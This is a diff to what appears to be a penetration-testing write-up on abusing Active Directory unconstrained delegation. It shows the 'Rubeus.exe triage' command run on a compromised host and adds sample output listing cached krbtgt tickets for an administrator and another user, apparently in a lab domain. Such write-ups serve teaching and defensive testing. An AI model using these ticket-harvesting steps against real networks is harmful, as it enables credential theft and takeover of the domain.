@@ -31,5 +31,12 @@ Unconstrained      : True
 After compromising `APP01$` computer we can use Rubeus or mimikatz for exporting the user's TGT who connected to this computer. Below we are using Rubeus.
 ```
 C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+-------------------------------------------------------------------------------------------------------------------- 
+ | LUID     | UserName                  | Service                                       | EndTime                  |
+ ------------------------------------------------------------------------------------------------------------------| 
+ | 0x41a4c3 | administrator @ DEV.DHITALCORP.LOCAL | krbtgt/DEV.DHITALCORP.LOCAL        |   3/7/2024 3:52:17 PM    |
+ ------------------------------------------------------------------------------------------------------------------| 
+ | 0x35b5d2 | jdoe @ DEV.DHITALCORP.LOCAL | krbtgt/DEV.DHITALCORP.LOCAL                 |   3/7/2024 4:12:45 PM    |
+ ------------------------------------------------------------------------------------------------------------------| 
 
 ```
